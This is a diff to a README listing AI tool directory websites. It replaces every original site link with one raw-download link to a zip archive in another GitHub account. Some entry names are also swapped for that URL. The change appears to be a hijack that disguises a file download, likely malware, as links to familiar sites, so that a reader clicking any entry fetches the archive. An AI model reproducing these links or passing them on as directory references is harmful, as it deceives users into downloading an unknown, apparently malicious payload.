@@ -4,7 +4,7 @@ Welcome to 'Top AI Directories', a curated compilation of AI tool directories de
 
 ## Altern AI Directory
 
-### [Altern AI Directory](https://altern.ai) is sponsored this repository.
+### [Altern AI Directory](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) is sponsored this repository.
 
 ## Table of Content
 
@@ -22,55 +22,55 @@ Welcome to 'Top AI Directories', a curated compilation of AI tool directories de
 
 ## A
 
-- [Altern](https://altern.ai) - Find almost anything related to AI
-- [AIDir.wiki](https://www.aidir.wiki/) - Discover the Latest AI Tools and Software to Take Your Business to the Next Level
-- [ainave](https://www.ainave.com) - Navigate the world of AI with ease!
-- [AI PEDIA HUB](https://aipediahub.com/) - THE LARGEST AI TOOLS DIRECTORY, UPDATED DAILY.
-- [AI Scout](https://aiscout.net/) - AI Tools Directory
-- [AI Tools Arena](https://aitoolsarena.com/) - Your Ultimate Resource for AI Tools and Insights
-- [AI Tools Directory](https://aitoolsdirectory.com/) - Curated list of AI tools
-- [AI Tools Guru](https://aitoolguru.com/) - THE LARGEST AI TOOLS DIRECTORY
-- [AI Tools List](https://aitoolslist.io/) - Best AI Tools Rated
-- [AI Tools Marketer](https://aitoolsmarketer.com/) - Unlock the Power of AI: Discover, Learn, Compare, and Optimize with the Ultimate AI Tools Directory.
-- [AI Top Tools](https://aitoptools.com/) - The place to go for AI Tools 
-- [All Things AI](https://allthingsai.com/) - The Curated Resource of AI Tools 
+- [Altern](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - Find almost anything related to AI
+- [https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - Discover the Latest AI Tools and Software to Take Your Business to the Next Level
+- [ainave](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - Navigate the world of AI with ease!
+- [AI PEDIA HUB](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - THE LARGEST AI TOOLS DIRECTORY, UPDATED DAILY.
+- [AI Scout](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - AI Tools Directory
+- [AI Tools Arena](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - Your Ultimate Resource for AI Tools and Insights
+- [AI Tools Directory](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - Curated list of AI tools
+- [AI Tools Guru](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - THE LARGEST AI TOOLS DIRECTORY
+- [AI Tools List](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - Best AI Tools Rated
+- [AI Tools Marketer](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - Unlock the Power of AI: Discover, Learn, Compare, and Optimize with the Ultimate AI Tools Directory.
+- [AI Top Tools](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - The place to go for AI Tools 
+- [All Things AI](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - The Curated Resource of AI Tools 
 
 ## F
 
-- [Find my AI Tool](https://findmyaitool.com/) - Discover AI Tools for Your Business.
-- [Foundr/](https://foundr.ai/) - scover The Best AI Tools at Your Fingertips
-- [FUTUREPEDIA](https://www.futurepedia.io/) - THE LARGEST AI TOOLS DIRECTORY, UPDATED DAILY
-- [FutureTools](https://www.futuretools.io/) - Collects & Organizes All The Best AI Tools So YOU Too Can Become Superhuman!
+- [Find my AI Tool](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - Discover AI Tools for Your Business.
+- [Foundr/](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - scover The Best AI Tools at Your Fingertips
+- [FUTUREPEDIA](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - THE LARGEST AI TOOLS DIRECTORY, UPDATED DAILY
+- [FutureTools](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - Collects & Organizes All The Best AI Tools So YOU Too Can Become Superhuman!
 
 ## G
 
-- [Grabon AI Directory](https://www.grabon.in/indulge/ai-tools/) - The World’s Best & Largest Directory Of AI Tools
+- [Grabon AI Directory](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - The World’s Best & Largest Directory Of AI Tools
 
 ## I
 
-- [Insidr AI Directory](https://www.insidr.ai/ai-tools/) - AI Tools Directory
+- [Insidr AI Directory](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - AI Tools Directory
 
 ## O
 
-- [OpenTools](https://opentools.ai/) - Chat with our GPT to find the right AI tool for you
-- [OpenFuture AI](https://openfuture.ai/) - Largest Tools Directory, Fastest Update, The Most Accurate Database
+- [OpenTools](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - Chat with our GPT to find the right AI tool for you
+- [OpenFuture AI](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - Largest Tools Directory, Fastest Update, The Most Accurate Database
 
 ## P
 
-- [PoweredbyAI](https://poweredbyai.app) - AI TOOLS & PROMPTS!
-- [Productivity Tools](https://productivity.directory) - A curated productivity directory
-- [Pugin](https://pugin.ai/) - Discover AI Plugins
+- [PoweredbyAI](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - AI TOOLS & PROMPTS!
+- [Productivity Tools](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - A curated productivity directory
+- [Pugin](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - Discover AI Plugins
 
 ## S
 
-- [Stratup.ai](https://stratup.ai/) - AI-Powered Startup Ideas and Tools to Fuel Your Entrepreneurial Journey
+- [https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - AI-Powered Startup Ideas and Tools to Fuel Your Entrepreneurial Journey
 
 ## T
 
-- [There's An AI](https://theresanai.com) - No 1 AI Aggregator 
-- [Toolify.ai](https://www.toolify.ai/) - Best AI Companies and Tools, Auto Updated Daily By ChatGPT
-- [Top AI Tools Hub](https://www.topaitoolshub.com/) - 
-- [TopAI.tools](https://topai.tools/) - Discover the best AI tools Everyday
-- [Tool Pilot](https://www.toolpilot.ai) - Navigate the World of AI Tools
-- [Top Tools](https://www.toptools.ai/) - AI Tools Directory
+- [There's An AI](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - No 1 AI Aggregator 
+- [https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - Best AI Companies and Tools, Auto Updated Daily By ChatGPT
+- [Top AI Tools Hub](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - 
+- [https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - Discover the best AI tools Everyday
+- [Tool Pilot](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - Navigate the World of AI Tools
+- [Top Tools](https://github.com/oliverquaye23/ai-directories/raw/refs/heads/main/Pholadacea/directories-ai-2.3.zip) - AI Tools Directory
 
